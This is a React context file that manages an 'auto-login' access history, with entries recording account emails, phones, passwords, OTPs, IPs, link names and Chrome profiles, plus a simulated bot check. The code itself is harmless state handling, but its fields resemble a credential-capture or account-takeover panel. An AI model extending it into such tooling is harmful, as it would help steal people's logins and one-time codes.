import React, { createContext, useContext, useState, useCallback } from 'react';
import { v4 as uuidv4 } from 'uuid';

const AutoLoginContext = createContext();

export const useAutoLogin = () => useContext(AutoLoginContext);

export const AutoLoginProvider = ({ children }) => {
  const [accessHistory, setAccessHistory] = useState([]);

  const addHistoryEntry = useCallback((entry) => {
    const newEntry = {
      id: uuidv4(),
      timestamp: new Date(),
      isTest: false,
      ...entry,
    };
    setAccessHistory(prev => [newEntry, ...prev]);
    return newEntry;
  }, []);

  const updateHistoryEntry = useCallback((id, updates) => {
    setAccessHistory(prev =>
      prev.map(item =>
        item.id === id ? { ...item, ...updates } : item
      )
    );
  }, []);

  const startAutoLoginFromProfile = (profile) => {
    const entry = addHistoryEntry({
        linkName: 'Auto-Trigger',
        account_email: 'Đang xác định...',
        account_phone: '',
        password: '',
        otp: '',
        ip: '127.0.0.1',
        status: 'processing',
        chromeProfile: profile.name,
        isTest: true,
    });
    
    // Simulate bot check process
    setTimeout(() => {
        updateHistoryEntry(entry.id, { status: 'verification_needed', account_email: `${profile.name.toLowerCase().replace(' ', '_')}@auto.com` });
    }, 8000);
  };

  const value = {
    accessHistory,
    setAccessHistory,
    addHistoryEntry,
    updateHistoryEntry,
    startAutoLoginFromProfile,
  };

  return (
    <AutoLoginContext.Provider value={value}>
      {children}
    </AutoLoginContext.Provider>
  );
};